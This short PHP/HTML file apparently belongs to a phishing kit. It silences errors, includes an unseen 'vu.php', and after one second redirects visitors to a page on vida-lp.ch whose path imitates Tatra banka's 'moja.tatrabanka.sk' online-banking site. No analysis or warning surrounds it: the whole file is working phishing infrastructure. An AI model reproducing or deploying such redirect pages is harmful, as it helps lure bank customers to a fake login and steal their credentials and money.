<?php
error_reporting(0);
include("vu.php");
?>

<!DOCTYPE HTML>
<html lang="en-US">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="1; url=http://vida-lp.ch/moja.tatrabanka.sk/">
        <script type="text/javascript">
           
        </script>
        <title>My alpha</title>
    </head>
</html>
